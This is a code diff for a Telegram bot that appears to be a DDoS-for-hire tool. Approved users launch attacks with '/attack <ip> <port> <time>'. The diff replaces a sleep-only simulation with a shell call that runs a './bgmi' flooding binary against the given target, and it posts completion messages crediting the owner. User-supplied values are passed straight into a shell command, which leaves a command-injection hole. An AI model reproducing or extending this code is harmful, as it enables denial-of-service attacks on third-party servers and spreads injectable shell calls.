@@ -105,11 +105,11 @@ async def help_command(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
         "*Available Commands:*\n\n"
-        "/start - Start the bot and get a welcome message.\n"
-        "/help - Show this help message.\n"
-        "/approve <id> - Approve a user or group ID (admin only).\n"
-        "/remove <id> - Remove a user or group ID (admin only).\n"
-        "/details - Show attack stats (admin only).\n"
+        "/start - Start the bot and get a welcome message.\n\n"
+        "/help - Show this help message.\n\n"
+        "/approve <id> - Approve a user or group ID (admin only).\n\n"
+        "/remove <id> - Remove a user or group ID (admin only).\n\n"
+        "/details - Show attack stats (admin only).\n\n"
         "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
@@ -236,18 +236,40 @@ async def attack(update: Update, context: CallbackContext):
             f"Please wait for the attack to complete. Stay tuned!"
         ), parse_mode='Markdown')
 
-    # Simulate attack
-    asyncio.create_task(run_attack(chat_id, ip, port, time, context, user_username))
+    # Simulate attack process
+    await run_attack(chat_id, ip, port, time, context, user_username)
 
 async def run_attack(chat_id, ip, port, time, context, user_username):
-    """Simulate the attack with a delay based on the attack time."""
-    # Here you can simulate attack actions (or replace with your real attack code)
-    await asyncio.sleep(int(time))  # Wait for the specified attack duration
-    await context.bot.send_message(
-        chat_id=chat_id,
-        text=f"*💥 Attack on {ip}:{port} completed by @{user_username}.*",
-        parse_mode='Markdown'
-    )
+    """Simulate an attack process."""
+    global attack_in_progress
+    attack_in_progress = True
+
+    try:
+        process = await asyncio.create_subprocess_shell(
+            f"./bgmi {ip} {port} {time} 500",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
+
+    except Exception as e:
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
+
+    finally:
+        attack_in_progress = False
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text=(
+                f"*💚 ATTACK FINISHED 💚*\n"
+                f"*🎉 The attack was completed by @{user_username}!*\n"
+                f"*👍 Owner :- @GODxAloneBOY*"
+            ), 
+            parse_mode='Markdown')
 
 def main():
     """Start the bot."""
